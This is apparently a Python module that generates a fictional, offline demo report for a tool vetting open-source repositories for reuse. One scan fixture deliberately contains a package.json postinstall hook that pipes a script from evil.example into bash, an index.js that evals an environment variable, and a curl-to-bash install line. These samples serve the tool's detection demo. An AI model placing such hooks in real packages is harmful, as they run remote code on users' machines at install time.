"""A deterministic, offline demo report.

The demo exists so a new user can see the output shape without a GitHub token,
without network access, and without sending any repository data anywhere. Every
repository in it is fictional and clearly labelled in the rendered report.
"""

from __future__ import annotations

import tempfile
from datetime import datetime, timedelta, timezone
from pathlib import Path

from . import __version__
from .adapters.scanner import scan_directory
from .models import (
    Assessment,
    Candidate,
    FilterResult,
    FilterStatus,
    RepoMeta,
    Report,
    ScanReport,
    ScanStatus,
)
from .stages.recall import score_similarity
from .stages.verdict import decide

_NOW = datetime.now(timezone.utc)


def build_demo_report() -> Report:
    seed = _repo(
        "acme/http-kit",
        "Demo seed: a small, typed HTTP client toolkit for service-to-service calls.",
        stars=4200,
        forks=310,
        language="Python",
        topics=["http", "client", "python", "requests", "toolkit"],
        license_spdx="MIT",
        days_since_push=4,
        created_days_ago=1600,
    )
    web_client = _repo(
        "acme/web-client",
        "A modern async HTTP client with retries, connection pooling, and typed responses.",
        stars=2800,
        forks=180,
        language="Python",
        topics=["http", "client", "rest", "python"],
        license_spdx="Apache-2.0",
        days_since_push=12,
        created_days_ago=900,
    )
    legacy = _repo(
        "acme/legacy-http",
        "An older synchronous HTTP helper retained for compatibility.",
        stars=950,
        forks=140,
        language="Python",
        topics=["http", "client", "python"],
        license_spdx="BSD-3-Clause",
        days_since_push=980,
        created_days_ago=2600,
        archived=True,
    )
    suspicious = _repo(
        "acme/suspicious-helper",
        "A tiny HTTP convenience wrapper. Demo fixture with intentionally risky patterns.",
        stars=700,
        forks=41,
        language="JavaScript",
        topics=["http", "client", "javascript"],
        license_spdx="MIT",
        days_since_push=30,
        created_days_ago=500,
    )
    abandoned = _repo(
        "acme/abandoned-http",
        "An unmaintained HTTP wrapper with no recent activity.",
        stars=60,
        forks=8,
        language="Python",
        topics=["http", "client", "python"],
        license_spdx=None,
        days_since_push=1500,
        created_days_ago=2400,
    )

    clean_scan = _scan_fixture(
        {
            "README.md": "# Demo\n\nA small HTTP client.\n\n```bash\npip install demo-http\n```\n",
            "src/demo/client.py": (
                "class Client:\n    def get(self, url: str) -> str:\n        return url\n"
            ),
            "pyproject.toml": '[project]\nname = "demo-http"\nversion = "1.0.0"\n',
        }
    )
    risky_scan = _scan_fixture(
        {
            "package.json": (
                '{\n  "name": "http-helper",\n  "version": "0.4.0",\n'
                '  "scripts": {\n    "postinstall": '
                '"curl -fsSL https://evil.example/install.sh | bash"\n  }\n}\n'
            ),
            "index.js": (
                "const cp = require('child_process');\n"
                "eval(process.env.PAYLOAD || 'console.log(1)');\n"
            ),
            "README.md": (
                "# http-helper\n\nInstall with:\n\n"
                "```bash\ncurl https://example.com/install.sh | bash\n```\n"
            ),
        }
    )

    seed_filter = _filter(
        FilterStatus.PASSED,
        7.8,
        "2026-10-20",
        {
            "Maintained": 10,
            "Code-Review": 9,
            "Dangerous-Workflow": 10,
            "Token-Permissions": 8,
            "Vulnerabilities": 10,
            "Binary-Artifacts": 10,
            "Pinned-Dependencies": 9,
        },
    )
    web_filter = _filter(
        FilterStatus.PASSED,
        8.1,
        "2026-10-22",
        {
            "Maintained": 10,
            "Code-Review": 10,
            "Dangerous-Workflow": 10,
            "Token-Permissions": 9,
            "Vulnerabilities": 10,
            "Binary-Artifacts": 10,
            "Pinned-Dependencies": 10,
        },
    )
    legacy_filter = FilterResult(
        status=FilterStatus.UNKNOWN,
        error="repository is not in the OpenSSF Scorecard dataset",
        reasons=[
            "OpenSSF Scorecard has no public record for this repository.",
            "Maintenance and project-practice signals could not be checked.",
        ],
    )
    suspicious_filter = _filter(
        FilterStatus.PASSED,
        6.0,
        "2026-10-18",
        {
            "Maintained": 8,
            "Code-Review": 5,
            "Dangerous-Workflow": 0,
            "Token-Permissions": 5,
            "Vulnerabilities": 10,
            "Binary-Artifacts": 10,
            "Pinned-Dependencies": 6,
        },
        warnings=["Dangerous-Workflow check scored 0."],
    )
    abandoned_filter = _filter(
        FilterStatus.SKIPPED,
        0.8,
        "2024-01-12",
        {"Maintained": 0, "Vulnerabilities": 0},
        reasons=[
            "OpenSSF Scorecard score: 0.8/10.",
            "Maintained and Vulnerabilities checks both scored 0.",
            "Score 0.8 is below the 2.0 skip threshold.",
        ],
    )

    assessments = [
        _assessment(seed, "seed", None, seed_filter, clean_scan),
        _assessment(
            web_client, "alternative", score_similarity(seed, web_client), web_filter, clean_scan
        ),
        _assessment(
            legacy, "alternative", score_similarity(seed, legacy), legacy_filter, clean_scan
        ),
        _assessment(
            suspicious,
            "alternative",
            score_similarity(seed, suspicious),
            suspicious_filter,
            risky_scan,
        ),
        _assessment(
            abandoned,
            "alternative",
            score_similarity(seed, abandoned),
            abandoned_filter,
            ScanReport(
                status=ScanStatus.SKIPPED,
                error="Skipped because the reputation filter rejected the repository.",
            ),
        ),
    ]

    return Report(
        tool_version=__version__,
        generated_at=_NOW,
        seed=seed,
        assessments=assessments,
        recall_queries=[
            "topic:http language:Python stars:>=50 fork:false",
            "http client typed toolkit language:Python stars:>=50 fork:false",
        ],
        warnings=["Demo data: all repository names, scores, and findings are fictional."],
        settings={
            "max_candidates": 4,
            "max_repo_mb": 150,
            "max_files": 2000,
            "scorecard_min": 2.0,
            "token_configured": False,
        },
        elapsed_seconds=3.2,
        demo=True,
    )


def _repo(
    full_name: str,
    description: str,
    *,
    stars: int,
    forks: int,
    language: str,
    topics: list[str],
    license_spdx: str | None,
    days_since_push: int,
    created_days_ago: int,
    archived: bool = False,
) -> RepoMeta:
    return RepoMeta(
        full_name=full_name,
        html_url=f"https://github.com/{full_name}",
        description=description,
        stars=stars,
        forks=forks,
        language=language,
        topics=topics,
        license_spdx=license_spdx,
        pushed_at=_NOW - timedelta(days=days_since_push),
        created_at=_NOW - timedelta(days=created_days_ago),
        archived=archived,
        default_branch="main",
        size_kb=2400,
    )


def _filter(
    status: FilterStatus,
    score: float,
    checked_at: str,
    checks: dict[str, float],
    *,
    reasons: list[str] | None = None,
    warnings: list[str] | None = None,
) -> FilterResult:
    return FilterResult(
        status=status,
        score=score,
        checked_at=checked_at,
        checks=checks,
        reasons=reasons or [f"OpenSSF Scorecard score: {score:.1f}/10."],
        warnings=warnings or [],
    )


def _assessment(
    repo: RepoMeta,
    role: str,
    similarity,
    filter_result: FilterResult,
    scan: ScanReport,
) -> Assessment:
    verdict = decide(repo, filter_result, scan)
    return Assessment(
        candidate=Candidate(repo=repo, role=role, similarity=similarity),
        filter=filter_result,
        scan=scan,
        verdict=verdict,
    )


def _scan_fixture(files: dict[str, str]) -> ScanReport:
    with tempfile.TemporaryDirectory(prefix="reuseguard-demo-") as directory:
        root = Path(directory)
        for relative, content in files.items():
            path = root / relative
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(content, encoding="utf-8")
        return scan_directory(root)
